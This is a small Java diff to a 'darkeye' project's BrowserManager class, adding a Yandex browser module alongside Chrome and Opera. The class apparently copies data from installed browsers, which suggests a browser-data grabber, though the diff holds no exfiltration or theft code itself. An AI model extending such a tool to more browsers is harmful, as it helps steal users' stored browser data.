@@ -7,6 +7,7 @@ import java.util.List;
 import org.spray.darkeye.module.BrowserModule;
 import org.spray.darkeye.module.browsers.ChromeBrowser;
 import org.spray.darkeye.module.browsers.OperaBrowser;
+import org.spray.darkeye.module.browsers.YandexBrowser;
 import org.spray.darkeye.objects.Data;
 
 public class BrowserManager extends CopyManager {
@@ -15,7 +16,8 @@ public class BrowserManager extends CopyManager {
 		super(path);
 	}
 
-	private List<BrowserModule> browsers = Arrays.asList(new ChromeBrowser(), new OperaBrowser());
+	private List<BrowserModule> browsers = Arrays.asList(
+			new ChromeBrowser(), new OperaBrowser(), new YandexBrowser());
 
 	@Override
 	protected List<Data> getData() {
